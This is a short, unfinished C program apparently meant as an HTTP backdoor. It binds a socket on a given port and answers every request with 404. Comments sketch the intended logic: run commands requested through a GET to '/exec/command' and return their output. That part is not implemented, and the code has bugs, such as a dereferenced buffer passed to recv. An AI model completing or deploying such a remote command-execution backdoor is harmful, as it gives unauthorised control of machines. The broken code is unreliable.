#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {

    int port = atoi(argv[1]);

    int server_socket;
    server_socket = socket(PF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = INADDR_ANY;

    bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));

    listen(server_socket, 1);    

    //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
    //MUST ALLOW GET AND HEAD METHODS, NONE ELSE - code 405 method not allowed
    char *notfound_response =
        "HTTP/1.1 404 Not Found\r\n\r\n";

    char *bd_response = 
        "HTTP/1.1 200 OK\r\n\r\n";

    int client_socket;
    char client_buffer[1024];

    //Need to figure out how to safely close socket on ^C or SIGINT

    while(1) {
        client_socket = accept(server_socket, NULL, NULL);
        recv(client_socket, *client_buffer, sizeof(client_buffer), 0);
        //parse client_buffer
        //if GET && url is /exec/command (depends on rtn val){
        //the_goods = strcat(bd_response, stdout);
        //send(client_socket, the_goods, strlen(the_goods), 0);
        //}
        
        //else {
        send(client_socket, notfound_response, strlen(notfound_response), 0);
        close(client_socket);
        //}
    }

    return 0;

    //Flush socket and close at end!!
}